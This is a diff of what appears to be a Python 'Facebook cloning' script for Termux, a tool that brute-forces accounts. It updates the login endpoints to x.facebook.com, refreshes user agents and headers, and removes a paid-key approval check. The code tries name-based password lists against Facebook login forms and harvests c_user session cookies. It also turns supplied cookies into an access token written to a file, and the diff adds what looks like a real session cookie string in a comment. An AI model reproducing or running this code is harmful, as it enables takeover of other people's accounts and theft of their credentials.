@@ -7,21 +7,21 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system("xdg-open https://www.facebook.com/groups/893149411835087/?ref=share")
+os.system('xdg-open https://www.facebook.com/groups/893149411835087/?ref=share/')
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
 rqts=r1+r2+r3+r4+r5+r6+r7+r8
 y1=('-');y2=('y');y3=(' > ')
 ys=y1+y2+y3
-print('\n\033[1;32m install missing modules...\n It will take some seconds...')
+print('\n\033[1;91m[\033[1;97m-\033[1;91m] install missing modules...\n \033[1;91m[\033[1;97m-\033[1;91m] It will take some seconds...')
 os.system(f'pip {ustl} {rqts} {ys}/dev/null')
 os.system(f'pip install {rqts}{y3}/dev/null')
 try:
 	import os,requests,json,time,re,random,sys,uuid,string,subprocess
 	from string import *
 	import bs4
-	#import dz
+	import dz
 	from concurrent.futures import ThreadPoolExecutor as tred
 	from bs4 import BeautifulSoup as sop
 	from bs4 import BeautifulSoup
@@ -113,12 +113,13 @@ logo=("""\033[1;32m
              ##      ###      ########  
        ##    ##     ## ##     ##     ## 
        ##    ##    ##   ##    ##     ## 
-        ######    ##     ##   ########
+        ######    ##     ##   ######## 
 \033[1;93m--------------------------------------------------
 \033[1;37m[-] AUTHOR    :\033[1;32m AWAIS TAHIR 
-\033[1;37m[-] GITHUB    :\033[1;32m Lamdbrand
-\033[1;37m[-] VERSION   :\033[1;32m 1.5
+\033[1;37m[-] GITHUB    :\033[1;32m JUTTBRAND
+\033[1;37m[-] VERSION   :\033[1;32m 3.4
 \033[1;37m[-] STATUS    :\033[1;32m PREMIUM
+ open source by Haris AKHTAR (Harry) fuck you ❤️
 --------------------------------------------------
 \033[1;37m[-]Dear Paid user:
 \033[1;37m[-]Your subscription last date 25/12/22
@@ -445,7 +446,7 @@ def login():
     cookies = input(' Put cookies here: ')
     try:
         print('\n Validating cookies ... ')
-        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 11; M2010J19SY Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
         find_token = re.search("(EAAG\w+)", data.text)
         open("access_token.txt", "w").write(find_token.group(1))
         open("fb_cookies.txt","w").write(cookies)
@@ -730,10 +731,10 @@ def ffb(ids,names,passlist):
 		for fikr in passlist:
 			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 			ua=random.choice(ugen)
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="103", "Google Chrome";v="103"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+			complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
@@ -844,7 +845,7 @@ def rcrack(ids,passlist):
 			sys.stdout.write('\r\r\033[1;32m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://x.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -855,21 +856,22 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'web.facebook.com',
-			'method': 'POST',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': pro}
-			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			header_freefb = {'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=monaY2g9vokwWcyMUa_FbvUo; sb=monaYy2hPCjOdRKlGNVC16Kk; vpd=v1%3B766x393x2.75; zsh=ASTj85b1ZABgpqq3bfzw3CxogaQjKMTc-1IsB_-LP_WVvAPKGzBJGzrpP3pubOBkPA7PYz1x8L-tU8dCrhajDfdMUAj2XyulFdGMxK31Xvfn7Fy6OgqTeHkkV21S4KBqY29nr4p_wkAcO_ohh8fQzI6g5fUkvMjmo55Aw_6btjC9REJ5tU1Vfzb7awoqYqe-w8iLLjUnsGUZI1HrWExraMYCg-vEHdjPsY02zdrr9DQYe3a1nFN2z-89RurDK96PALxM4A5p8BbCSaN80Bdq7bWA4fCeQu4U9DzA568fgnO0JmuXq0393uwUfjINOZwjBNiiAsapMhBRRjv4o-JKDKHdqPapOB5-nC88COwTN53gmWAW; dpr=2.75; locale=en_US; m_pixel_ratio=2.75; wd=393x766; fr=0zeubKinRNud7TC85.AWXH4FYyJsRz5s5t2sBU5cuq3SQ.Bj_kit.rQ.AAA.0.0.BkHyhN.AWXBckV_3DM',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -901,119 +903,4 @@ def rcrack(ids,passlist):
 	except:
 		pass
 
-def menu_apikey():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "_".join(uuid)
-  server = requests.get('https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt').text
-  
- 
-
-  os.system(" clear")                          
-  print("""\033[1;32m
-\033[1;32m 
- ___      ___  ___  ___   ________  
-|"  \    /"  ||"  \/"  | /"       ) 
- \   \  //   | \   \  / (:   \___/  
- /\\  \/.    |  \\  \/   \___  \    
-|: \.        |  /\.  \    __/  \\   
-|.  \    /:  | /  \   \  /" \   :)  
-|___|\__/|___||___/\___|(_______/ 
- \033[1;93m=================================================
-\033[1;37m[-] AUTHOR    :\033[1;32m MALIK SOHAIL
-\033[1;37m[-] GITHUB    :\033[1;32m JANI906
-\033[1;37m[-] WhatsApp  :\033[1;32m +923077681556 
-\033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
-\033[1;37m[-] VERSION   :\033[1;32m 1.1
-\033[1;37m[-] STATUS    :\033[1;32m PAID
-==================================================
-\033[1;33m[*]TOOLS  : Facebook cloning
-\033[1;37m[*]Status : PAID
-==================================================
- \33[37;41m\t IF YOU ARE PAID USE COME TO INBOX\33[0;m
-\033[1;93m=================================================
- \033[1;35m[*]First read NOTE:
- \033[1;37m[*]if facebook go on update you get not
- \033[1;37m[*]Ok idz we dont  responsible 
- \033[1;37m[*]you unstall termux and key need approval
-================================================== 
- [*] File cloning
- [*] Create file
- [*] Random cloning
- [*] Gmail cloning
- [*] contact with owner
- [0] Exit menu
-==================================================   """)
-
-  print("\t \033[1;37m  FIRST GET APPROVEL\033[1;37m ")
-  print("")
-  print(" \033[1;37m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
-  print("")
-  print("\x1b[1;97m   contact Admin to Buy this Tools                                                               ");time.sleep (0.1) 
-  print("")
-  print("\033[1;37     YOUR  KEY : "+id)
-  print("")
-  print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
-  print("  SEND KEY ON ADMIN WHATSAPP,,,,,,,,,,,,,,,,,    ");time.sleep(1)
-  os.system('xdg-open https://wa.me/+923077681556')
-  print("");time.sleep(2)
-  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
-  try:
-    httpCaht = requests.get("https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt").text
-    if id in httpCaht:
-      print("\033[1;97m   YOUR TOKEN APROVED DONE ");time.sleep(2)
-      msg = str(os.geteuid())
-      time.sleep(0.5)
-      pass
-    else:
-      
-      print("\x1b[1;97m    Sorry Bro Token Key not APROVED˜“")
-      print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/+923077681556')
-      time.sleep(2)
-      sys.exit()
-  except:
-    sys.exit()
-    if name == '__main__':
-    	print(logo)
-    	menu_apikey()
-menu_apikey() 
-
-
-
-def tnx():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "_".join(uuid)
-  server = requests.get('https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt').text
-  
- 
-
-  os.system(" clear ")
-  print(logo)
-  print(" Wait bro,,,, ")
-  print(" Chacking Your Aproval ")
-  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
-  try:
-    httpCaht = requests.get("https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt").text
-    if id in httpCaht:
-      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
-      msg = str(os.geteuid())
-      time.sleep(0.5)
-      pass
-    else:
-      
-      print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
-      print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/+923077681556')
-      time.sleep(2)
-      sys.exit()
-  except:
-    sys.exit()
-    if name == '__main__': 
-    	print(logo)
-    	menu_apikey()
-try:
-	menu()
-except requests.exceptions.ConnectionError:
-	print('\n No internet connection ...')
-	exit()
-except:exit()
+menu()
